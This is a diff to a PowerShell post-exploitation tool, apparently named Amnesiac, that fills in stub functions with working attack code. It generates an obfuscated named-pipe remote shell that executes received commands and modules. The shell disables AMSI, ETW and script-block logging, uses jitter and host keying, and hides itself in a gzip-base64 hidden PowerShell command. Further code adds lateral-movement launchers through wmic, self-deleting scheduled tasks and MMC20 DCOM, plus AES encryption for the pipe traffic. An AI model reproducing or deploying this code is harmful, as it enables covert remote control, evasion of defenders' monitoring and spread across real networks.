@@ -93,8 +93,177 @@ function Get-EtwBypassSnippet {
 function Get-SblBypassSnippet {
     return "[Ref].Assembly.GetType('Sys'+'tem.Management.Auto'+'mation.Scri'+'ptBlock').GetField('checkScri'+'ptBlockLogg'+'ingCache','NonPublic,Static').SetValue(`$null,[Boolean]`$false)"
 }
-function New-PayloadScript      { param([switch]$IsServer,[string]$ComputerName,[string]$PipeName,[string]$SID,[hashtable]$Config) throw "Not implemented" }
-function Get-PayloadLauncher    { param([string]$Script,[string]$Launcher) throw "Not implemented" }
+function New-PayloadScript {
+    param(
+        [switch]$IsServer,
+        [string]$ComputerName,
+        [string]$PipeName,
+        [string]$SID,
+        [hashtable]$Config = $global:PayloadConfig
+    )
+
+    $minLen, $maxLen = switch ($Config.Obfuscation) {
+        'low'  { 4, 7 }
+        'high' { 12, 21 }
+        default { 6, 11 }
+    }
+    $rnd = { -join ((65..90 + 97..122) | Get-Random -Count (Get-Random -Min $minLen -Max $maxLen) | % { [char]$_ }) }
+
+    $splits = switch ($Config.Obfuscation) { 'low' { 2 }; 'high' { 5 }; default { 3 } }
+    $splitStr = {
+        param([string]$s)
+        $partLen = [Math]::Ceiling($s.Length / $splits)
+        $parts = for ($i = 0; $i -lt $s.Length; $i += $partLen) {
+            "'$($s.Substring($i, [Math]::Min($partLen, $s.Length - $i)))'"
+        }
+        $parts -join '+'
+    }
+
+    $vPipe=(&$rnd); $vRd=(&$rnd); $vWr=(&$rnd); $vCmd=(&$rnd)
+    $vRes=(&$rnd); $vErr=(&$rnd); $vJ=(&$rnd); $vT=(&$rnd)
+    $vSec=(&$rnd); $vSid=(&$rnd); $vAr=(&$rnd); $vTm=(&$rnd)
+    $vCb=(&$rnd); $vGz=(&$rnd); $vA=(&$rnd); $vB=(&$rnd)
+    $vC=(&$rnd); $vD=(&$rnd)
+
+    $amsiSnippet = Get-AmsiBypassSnippet -Technique $Config.Amsi
+    $etwSnippet  = Get-EtwBypassSnippet  -Technique $Config.Etw
+    $sblSnippet  = if ($Config.Sbl) { Get-SblBypassSnippet } else { '' }
+
+    $jitter = switch ($Config.Jitter) {
+        'off'  { '' }
+        'low'  { "`$$vJ=Get-Random -Min 0 -Max 2000;[Threading.Thread]::Sleep(`$$vJ)" }
+        'high' { "`$$vJ=Get-Random -Min 3000 -Max 10000;[Threading.Thread]::Sleep(`$$vJ)" }
+        default { "`$$vJ=Get-Random -Min 1000 -Max 5000;[Threading.Thread]::Sleep(`$$vJ)" }
+    }
+
+    $keyBlock = ''
+    if ($Config.Keys.Hostname) { $keyBlock += "if(`$env:COMPUTERNAME -ne '$($Config.Keys.Hostname)'){exit};" }
+    if ($Config.Keys.Domain)   { $keyBlock += "if((Get-WmiObject Win32_ComputerSystem).Domain -ne '$($Config.Keys.Domain)'){exit};" }
+    if ($Config.Keys.User)     { $keyBlock += "if(`$env:USERNAME -ne '$($Config.Keys.User)'){exit};" }
+
+    $marker  = $global:EndMarker
+    $bufSize = $global:BufferSize
+
+    $clientType = (& $splitStr 'System.IO.Pipes.NamedPipeCl') + "+'ientStream'"
+    $serverType = (& $splitStr 'System.IO.Pipes.NamedPipeSer') + "+'verStream'"
+    $asmLoad = "[void][Reflection.Assembly]::LoadWithPartialName('System.Core')"
+
+    $modVarBuf = & $rnd; $modVarLine = & $rnd; $modVarName = & $rnd
+    $moduleHandler = (
+        "if(`$$vCmd -match '^__MODULE_BEGIN__:(.+):(\\d+)`$'){" +
+        "`$$modVarName=`$Matches[1];`$$modVarBuf=[Text.StringBuilder]::new([int]`$Matches[2]);" +
+        "`$$modVarLine=`$$vRd.ReadLine();" +
+        "while(`$$modVarLine -ne `"__MODULE_END__:`$$modVarName`"){" +
+        "if(`$$modVarLine -match '^__MODULE_CHUNK__:(.+)`$'){`$$modVarBuf.Append([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(`$Matches[1])))|Out-Null};" +
+        "`$$modVarLine=`$$vRd.ReadLine()};" +
+        "try{& ([scriptblock]::Create(`$$modVarBuf.ToString())) 2>&1|Out-Null}catch{};" +
+        "`$$vWr.WriteLine('$marker');`$$vWr.Flush();continue}"
+    )
+
+    if (-not $IsServer) {
+        $pipeSetup = (
+            "`$$vT=$clientType;" +
+            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$ComputerName','$PipeName',[System.IO.Pipes.PipeDirection]::InOut,[System.IO.Pipes.PipeOptions]::None;" +
+            "`$$vRd=New-Object IO.StreamReader(`$$vPipe);" +
+            "`$$vWr=New-Object IO.StreamWriter(`$$vPipe);" +
+            "`$$vPipe.Connect(600000);" +
+            "`$$vWr.WriteLine(`"`$([Net.Dns]::GetHostByName((`$env:computerName)).HostName),`$(Get-Location),`$(whoami)`");" +
+            "`$$vWr.Flush()"
+        )
+        $loop = (
+            "while(`$true){" +
+            "`$$vCmd=`$$vRd.ReadLine();" +
+            "if(`$$vCmd -eq 'exit'){break};" +
+            "$moduleHandler;" +
+            "try{`$$vRes=& ([scriptblock]::Create(`$$vCmd)) 2>&1|Out-String;" +
+            "`$$vRes -split([char]10)|%{`$$vWr.WriteLine(`$_.TrimEnd())}}catch{`$$vErr=`$_.Exception.Message;`$$vErr -split([char]10)|%{`$$vWr.WriteLine(`$_)}};" +
+            "`$$vWr.WriteLine('$marker');`$$vWr.Flush()};" +
+            "`$$vPipe.Close();`$$vPipe.Dispose()"
+        )
+    } else {
+        $pipeSetup = (
+            "`$$vSec=New-Object System.IO.Pipes.PipeSecurity;" +
+            "`$$vSid=New-Object System.Security.Principal.SecurityIdentifier '$SID';" +
+            "`$$vAr=New-Object System.IO.Pipes.PipeAccessRule(`$$vSid,'FullControl','Allow');" +
+            "`$$vSec.AddAccessRule(`$$vAr);" +
+            "`$$vT=$serverType;" +
+            "`$$vPipe=New-Object -TypeName `$$vT -ArgumentList '$PipeName',[System.IO.Pipes.PipeDirection]::InOut,1,[System.IO.Pipes.PipeTransmissionMode]::Byte,[System.IO.Pipes.PipeOptions]::None,$bufSize,$bufSize,`$$vSec;" +
+            "`$$vCb={param(`$$vTm);`$$vTm.Close()};`$$vTm=New-Object System.Threading.Timer(`$$vCb,`$$vPipe,600000,[System.Threading.Timeout]::Infinite);" +
+            "`$$vPipe.WaitForConnection();" +
+            "`$$vTm.Change([System.Threading.Timeout]::Infinite,[System.Threading.Timeout]::Infinite);`$$vTm.Dispose();" +
+            "`$$vRd=New-Object IO.StreamReader(`$$vPipe);" +
+            "`$$vWr=New-Object IO.StreamWriter(`$$vPipe)"
+        )
+        $loop = (
+            "while(`$true){if(-not `$$vPipe.IsConnected){break};" +
+            "`$$vCmd=`$$vRd.ReadLine();" +
+            "if(`$$vCmd -eq 'exit'){break};" +
+            "$moduleHandler;" +
+            "try{`$$vRes=& ([scriptblock]::Create(`$$vCmd)) 2>&1|Out-String;" +
+            "`$$vRes -split([char]10)|%{`$$vWr.WriteLine(`$_.TrimEnd())}}catch{`$$vErr=`$_.Exception.Message;`$$vErr -split([char]10)|%{`$$vWr.WriteLine(`$_)}};" +
+            "`$$vWr.WriteLine('$marker');`$$vWr.Flush()};" +
+            "`$$vPipe.Disconnect();`$$vPipe.Dispose()"
+        )
+    }
+
+    $rawScript = "$keyBlock;$asmLoad;$etwSnippet;$sblSnippet;$amsiSnippet;$jitter;$pipeSetup;$loop"
+
+    $bytes = [System.Text.Encoding]::UTF8.GetBytes($rawScript)
+    $ms    = [System.IO.MemoryStream]::new()
+    $gzs   = [System.IO.Compression.GzipStream]::new($ms, [System.IO.Compression.CompressionMode]::Compress)
+    $gzs.Write($bytes, 0, $bytes.Length)
+    $gzs.Close()
+    $b64 = [Convert]::ToBase64String($ms.ToArray())
+
+    $decomp = "`$$vGz='$b64';`$$vA=New-Object IO.MemoryStream(,[Convert]::FROmbAsE64StRiNg(`$$vGz));`$$vB=New-Object IO.Compression.GzipStream(`$$vA,[IO.Compression.CoMPressionMode]::deCOmPreSs);`$$vC=New-Object IO.MemoryStream;`$$vB.COpYTo(`$$vC);`$$vD=[Text.Encoding]::UTF8.GETSTrIng(`$$vC.ToArray());`$$vB.ClosE();`$$vA.ClosE();`$$vC.ClosE();[scriptblock]::Create(`$$vD).Invoke()"
+
+    return [PSCustomObject]@{
+        InlinePS    = $decomp
+        FullCommand = "powershell.exe -ep bypass -Window Hidden -c `"$decomp`""
+        RawScript   = $rawScript
+    }
+}
+
+function Get-PayloadLauncher {
+    param(
+        [string]$Script,
+        [string]$Launcher = 'ps'
+    )
+
+    switch ($Launcher) {
+        'ps' {
+            return "powershell.exe -ep bypass -Window Hidden -c `"$Script`""
+        }
+
+        'wmi' {
+            $escaped = $Script -replace '"','\"'
+            return "wmic process call create `"powershell.exe -ep bypass -Window Hidden -c \`"$escaped\`"`""
+        }
+
+        'schtask' {
+            $taskName = -join ((65..90 + 97..122) | Get-Random -Count 12 | % { [char]$_ })
+            $escaped  = $Script -replace '"','\"'
+            return (
+                "schtasks /create /tn $taskName /tr `"powershell.exe -ep bypass -Window Hidden -c \`"$escaped\`"`" /sc once /st 00:00 /f && " +
+                "schtasks /run /tn $taskName && " +
+                "timeout /t 3 >nul && " +
+                "schtasks /delete /tn $taskName /f"
+            )
+        }
+
+        'com' {
+            $escaped = $Script -replace "'","''"
+            return (
+                "`$_com = [activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.Application',`$env:COMPUTERNAME));" +
+                "`$_com.Document.ActiveView.ExecuteShellCommand('powershell.exe',`$null,'-ep bypass -Window Hidden -c ""$escaped""','7')"
+            )
+        }
+
+        default {
+            return Get-PayloadLauncher -Script $Script -Launcher 'ps'
+        }
+    }
+}
 function Initialize-DiskStructure {
     if (-not $global:DiskMode) { return }
     $basePath   = "C:\Users\Public\Documents\Amnesiac"
@@ -108,8 +277,44 @@ function Initialize-DiskStructure {
 function Initialize-ToolCache   {}
 function Send-Module            { param([string]$ToolName,$Writer,$Reader) throw "Not implemented" }
 function Test-NetworkLogonToken { return $false }
-function Protect-PipeMessage    { param([string]$PlainText,[byte[]]$Key) throw "Not implemented" }
-function Unprotect-PipeMessage  { param([string]$CipherB64,[byte[]]$Key) throw "Not implemented" }
+function Protect-PipeMessage {
+    param([string]$PlainText, [byte[]]$Key)
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key     = $Key
+    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aes.GenerateIV()
+    $iv         = $aes.IV
+    $enc        = $aes.CreateEncryptor()
+    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)
+    $cipher     = $enc.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
+    $aes.Dispose()
+    return [Convert]::ToBase64String($iv + $cipher)
+}
+
+function Unprotect-PipeMessage {
+    param([string]$CipherB64, [byte[]]$Key)
+    $bytes  = [Convert]::FromBase64String($CipherB64)
+    $iv     = $bytes[0..15]
+    $cipher = $bytes[16..($bytes.Length - 1)]
+    $aes = [System.Security.Cryptography.Aes]::Create()
+    $aes.Key     = $Key
+    $aes.IV      = $iv
+    $aes.Mode    = [System.Security.Cryptography.CipherMode]::CBC
+    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $dec   = $aes.CreateDecryptor()
+    $plain = $dec.TransformFinalBlock($cipher, 0, $cipher.Length)
+    $aes.Dispose()
+    return [System.Text.Encoding]::UTF8.GetString($plain)
+}
+
+function Get-PskDerivedKey {
+    param([string]$Passphrase)
+    $sha  = [System.Security.Cryptography.SHA256]::Create()
+    $hash = $sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Passphrase))
+    $sha.Dispose()
+    return $hash[0..15]
+}
 function Show-OpsecBanner       {}
 
 function Amnesiac {
